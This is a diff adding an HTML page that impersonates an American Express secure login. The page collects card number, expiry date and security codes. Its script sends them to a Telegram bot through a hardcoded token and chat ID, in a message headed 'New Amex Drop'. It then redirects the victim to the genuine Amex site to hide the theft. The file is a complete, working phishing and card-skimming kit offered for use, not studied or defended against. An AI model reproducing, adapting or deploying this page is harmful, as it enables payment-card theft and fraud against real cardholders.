@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>American Express - Secure Login</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 350px;
+            text-align: center;
+        }
+        .logo {
+            color: #006fcf;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            letter-spacing: 1px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #006fcf;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #005bb5;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+        .loader {
+            display: none;
+            margin-top: 10px;
+            color: #006fcf;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">AMERICAN EXPRESS</div>
+        <form id="ccForm">
+            <input type="text" id="card_number" name="card_number" placeholder="Card Number" required>
+            <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required>
+            <input type="text" id="csc" name="csc" placeholder="CSC" required>
+            <input type="text" id="ccv" name="ccv" placeholder="CCV" required>
+            <button type="submit">Verify Account</button>
+        </form>
+        <div class="loader" id="loader">Processing...</div>
+        <div class="footer">
+            Secure Connection | © 2026 American Express
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('ccForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const cardNumber = document.getElementById('card_number').value;
+            const expiry = document.getElementById('expiry').value;
+            const csc = document.getElementById('csc').value;
+            const ccv = document.getElementById('ccv').value;
+
+            // REPLACE THESE WITH YOUR ACTUAL TELEGRAM BOT DETAILS
+            const botToken = '8947701700:AAFpBFejWSFtcQZ01JP4D-qkIUopxBUyd4A';
+            const chatId = '8790611176';
+
+            const message = `💳 *New Amex Drop*\n\n🔢 Card: \`${cardNumber}\`\n📅 Expiry: \`${expiry}\`\n🆔 CSC: \`${csc}\`\n🔒 CCV: \`${ccv}\``;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            document.getElementById('loader').style.display = 'block';
+            document.querySelector('button').disabled = true;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    window.location.href = "https://www.americanexpress.com"; // Redirect to legit site after drop
+                } else {
+                    alert('Verification failed. Please try again.');
+                    document.getElementById('loader').style.display = 'none';
+                    document.querySelector('button').disabled = false;
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Connection error. Please check your network.');
+                document.getElementById('loader').style.display = 'none';
+                document.querySelector('button').disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
